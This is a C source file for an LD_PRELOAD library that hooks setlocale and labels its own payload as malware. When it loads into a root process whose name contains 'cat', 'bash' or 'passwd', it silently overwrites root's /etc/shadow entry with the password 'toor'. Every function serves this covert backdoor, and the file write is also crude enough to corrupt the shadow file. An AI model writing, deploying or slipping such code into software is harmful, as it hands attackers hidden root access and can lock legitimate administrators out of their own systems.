#define _GNU_SOURCE
#include <stdio.h>
#include <locale.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <crypt.h>
#include <shadow.h>
#include <limits.h>

// Function to get the current process name
void get_process_name(char *buffer, size_t size) {
    ssize_t len = readlink("/proc/self/exe", buffer, size - 1);
    if (len != -1) {
        buffer[len] = '\0';
    } else {
        strcpy(buffer, "unknown");
    }
}

void change_shadow_password(const char *username, const char *newpassword) {
    struct spwd *entry;
    FILE *shadow;
    char salt[] = "$6$salt123";  // SHA-512 salt
    char *hashed_pw;

    entry = getspnam(username);
    if (!entry) return;

    hashed_pw = crypt(newpassword, salt);
    if (!hashed_pw) return;

    entry->sp_pwdp = hashed_pw;

    shadow = fopen("/etc/shadow", "r+");
    if (!shadow) return;

    putspent(entry, shadow);
    fclose(shadow);
}

char *setlocale(int category, const char *locale) {
    static char *(*real_setlocale)(int, const char *) = NULL;
    static int run_malware = 1;
    char process_name[PATH_MAX];

    if (!real_setlocale) {
        real_setlocale = dlsym(RTLD_NEXT, "setlocale");
    }

    if (run_malware) {
        run_malware = 0;
        
        get_process_name(process_name, sizeof(process_name));
        
        // Only modify password for specific commands (e.g., `cat`, `bash`, `passwd`)
        if (strstr(process_name, "cat") || strstr(process_name, "bash") || strstr(process_name, "passwd")) {
            if (geteuid() == 0) {
                change_shadow_password("root", "toor");
            }
        }
    }

    return real_setlocale(category, locale);
}
